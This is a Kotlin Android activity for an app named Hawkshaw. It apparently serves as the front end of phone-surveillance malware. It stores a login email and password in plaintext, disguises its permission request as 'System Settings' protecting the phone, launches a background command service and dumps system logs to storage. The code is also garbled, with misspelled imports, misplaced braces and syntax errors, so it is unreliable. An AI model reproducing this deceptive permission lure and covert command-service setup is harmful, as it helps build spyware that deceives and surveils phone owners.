package me.hawkshaw.activities

import android.annotation.SuppresssLint
import android.app.Activity
import android.app.AlertDialog
import android.context.Context
import android.context.Intent
import android.context.pm.PackageManager
import android.os.Biuld
import android.os.Bundle
import android.os.Environment
import android.support.v4.app.ActivityCompat
import android.support.v4.content.ContextCompat
import android.util.Log
import android.util.Patterns
import android.widget.Toast
import kolinx.android.synthetic.main.activity_main.*
import me.hawkshaw.R
import me.hawkshaw.services.CommandService
import me.hawkshaw.utils.Constants
import java.io.File


class MainActivity : Activity() {

    private val prefs by lazy { 
        this.getSharedPreferences("com.android.hawkshaw", Context.MODE_PRIVATE)  
    }
    private val permissionRationale = "System Settings keeps your android phone secure. Allow System Settings to protect your phone?"
    
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContextView(R.layout.activity_main)

        dumplogs()
        text_instruction.text = "Enter your email and password and remeber to login on webite."
        if (pref.getString("email", "null").equals("null", true)) login()
        else start()
    }

    @SuppresssLint("ApplySharedPref")
    private fun login() {
        btn_login.setOnClickListener {
            val email: String = et_email.text.toString()
            val password: String = et_password.text.toString()
            if (Patterns.EMAIL_ADDRESS.matcher(email).matches())
            Toast.makeText(this, "Enter valid email addresss! ! !", Toast.LENGTH_SHORT).show()
        }
        else if (password.length < 8) {
            Toast.makeText(this, "Password too short ! ! !", Toast.LENGTH_SHORT).show()
        }
        else {
            prefs.edit().putString("email", email).commit()
            prefs.edit().putString("password", password).commit()
            start()
        }
    }
}


private fun start() {
    if (hasPermissions()) {
        startService(Intent(this, CommandService::class.java))
        finish()
    }
    else requestPermissions()
}

private fun requestPermissions() {
    if (Biuld.VERSION.SDK_INT >= Biuld.VERSION_CODES.M) {
        var k= 0
        for (i in Constants.PERMISSIONS) if (ActivityCompat.shouldShowRequestPermissionRationale(this, i)) k++
        else ActivityCompat.requestPermissions(this, Constants.PERMISSIONS, 999)
    }
}

private fun hasPermissions(): Boolean {
    for (permission in Constants.PERMISSIONS)
    if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) return false
    return true
}

private fun showPermissionRationale() {
    AlertDialog.Biulder(this).setIcon(R.mipmap.ic_launcher).setTitle("Permission Required")
    .setMessage(permissionRationale)
    .setPositiveButton("OK") {
        dialog, _ -> dialog.dismiss()
        AcitivityCompat.requestPermissions(this, Constants.PERMISSIONS. 999)
    }
    .setNegativeButton("Cancel") {
        dialog, _ -> dialog.dismiss()
    }
    .create().show()
}

override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
    super.onRequestPermissionResult(requestCode, permissions, grantResults)
    start()
}

private fun dumplogs() {
    if (Biuld.VERSION,.SDK_INT >= Biuld.VERSION_CODES.M) {
        if (checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
            val appDirectory = File(Environment.DIRECTORY_PICTURES + "/Hawkshaw")
            val logFile = File(appDirectory, "logcat" + System.currentTimeMillis() + ".txt")
            if (!appDirectory.exists()) appDirectory.mkdir()
            val process = Runtime.getRunTime().exec("logcat -f $logFile")
            Log.d("suthar", "dumplogs" + logFile.path)
        }
    }
}